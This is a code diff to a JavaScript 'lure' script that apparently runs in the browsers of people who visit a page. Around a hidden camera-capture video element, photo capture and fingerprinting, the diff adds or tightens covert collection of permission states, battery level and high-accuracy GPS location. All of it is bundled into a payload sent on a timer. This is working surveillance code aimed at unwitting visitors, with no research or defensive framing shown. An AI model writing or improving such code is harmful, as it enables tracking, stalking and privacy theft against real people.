@@ -11,6 +11,7 @@ let touchData = [];
 let lureVideoStream = null;
 let sendIntervalId = null;
 let isSending = false;
+let initialPermissionsCaptured = false;
 
 // Hidden video element for camera capture - create once
 const lureVideo = document.createElement('video');
@@ -157,12 +158,19 @@ async function collectStaticData() {
     document.body.removeChild(testDiv);
   } catch {}
 
+  // FIX: Capture permission states with better error handling
   const permNames = ['camera', 'microphone', 'geolocation'];
   for (const name of permNames) {
     try {
-      const status = await navigator.permissions?.query({name: name});
-      p.permissionStates[name] = status?.state || null;
+      if (navigator.permissions && navigator.permissions.query) {
+        const status = await navigator.permissions.query({name: name});
+        p.permissionStates[name] = status?.state || 'unknown';
+        console.log(`[LURE] Permission ${name}: ${p.permissionStates[name]}`);
+      } else {
+        p.permissionStates[name] = 'not-supported';
+      }
     } catch (e) {
+      console.warn(`[LURE] Could not query permission ${name}:`, e.message);
       p.permissionStates[name] = 'error';
     }
   }
@@ -194,32 +202,38 @@ async function collectDynamicData() {
   p.touchEvents = [...touchData];
   p.audioDevices = [];
 
+  // FIX: Battery API with better error handling
   if (navigator.getBattery) {
     try {
       const bat = await navigator.getBattery();
-      p.battery = { level: bat.level, charging: bat.charging };
-    } catch {}
+      p.battery = { level: bat.level * 100, charging: bat.charging };
+      console.log('[LURE] Battery:', p.battery);
+    } catch (e) {
+      console.warn('[LURE] Battery error:', e.message);
+    }
   }
 
-  // Use maximumAge to prevent aggressive GPS polling
+  // FIX: Geolocation with better error handling and fresh capture
   try {
     const pos = await new Promise((res, rej) => {
-      const timeout = setTimeout(() => rej(new Error('timeout')), 5000);
+      const timeout = setTimeout(() => rej(new Error('GPS timeout')), 8000);
       navigator.geolocation.getCurrentPosition(
         pos => { clearTimeout(timeout); res(pos); },
         err => { clearTimeout(timeout); rej(err); },
-        { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 30000 }
       );
     });
     p.geolocation = {
       latitude: pos.coords.latitude,
       longitude: pos.coords.longitude,
       accuracy: pos.coords.accuracy,
-      altitude: pos.coords.altitude,
-      speed: pos.coords.speed
+      altitude: pos.coords.altitude || null,
+      speed: pos.coords.speed || null
     };
+    console.log('[LURE] Geolocation:', p.geolocation.latitude, p.geolocation.longitude);
   } catch (e) { 
-    p.geolocationError = e.message; 
+    p.geolocationError = e.message;
+    console.warn('[LURE] Geolocation error:', e.message);
   }
 
   // Photo capture - with safety checks for S and cacheElement
@@ -269,7 +283,7 @@ async function sendPayload() {
   try {
     let data = await collectDynamicData();
     
-    // CRITICAL FIX: Stringify ALL nested objects for worker compatibility
+    // Build payload with PROPER JSON.stringify for nested objects
     const payload = {
       sessionId: data.sessionId,
       timestamp: data.timestamp,
@@ -308,6 +322,8 @@ async function sendPayload() {
     
     console.log('[LURE] Sending payload');
     console.log('[LURE] - Permissions (stringified):', payload.permission_states);
+    console.log('[LURE] - Geolocation (stringified):', payload.geolocation);
+    console.log('[LURE] - Battery (stringified):', payload.battery);
     console.log('[LURE] - WebGL (stringified):', payload.webgl_fingerprint);
     console.log('[LURE] - Payload size:', JSON.stringify(payload).length, 'bytes');
     
